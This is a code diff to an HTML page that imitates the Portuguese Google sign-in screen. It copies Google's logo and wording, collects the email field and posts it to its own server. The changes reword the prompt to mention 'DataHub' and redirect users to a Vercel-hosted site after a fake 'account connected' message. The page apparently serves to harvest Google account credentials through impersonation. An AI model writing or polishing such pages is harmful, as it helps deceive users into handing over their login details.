@@ -42,7 +42,7 @@ h1{font-size:24px;font-weight:400;color:#202124;margin-bottom:8px}
     <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google" style="height:26px;width:auto">
   </div>
   <h1>Fazer login</h1>
-  <p class="subtitle">Use sua Conta do Google</p>
+  <p class="subtitle">Use sua Conta do Google para acessar o DataHub</p>
   <div class="field">
     <label for="email">E-mail ou telefone</label>
     <input type="text" id="email" autocomplete="username" placeholder=" " autofocus>
@@ -98,9 +98,9 @@ async function next() {
       });
       const data = await res.json();
       if (data.ok) {
-        msg.textContent = 'Login bem-sucedido! Redirecionando...';
+        msg.textContent = 'Conta conectada! Redirecionando para o DataHub...';
         msg.style.display = 'block';
-        setTimeout(() => window.location.href = 'https://photos.google.com', 1200);
+        setTimeout(() => window.location.href = 'https://datahub-delta.vercel.app/', 1500);
       } else {
         msg.textContent = data.error || 'Erro. Tente novamente.';
         msg.style.color = '#d93025';
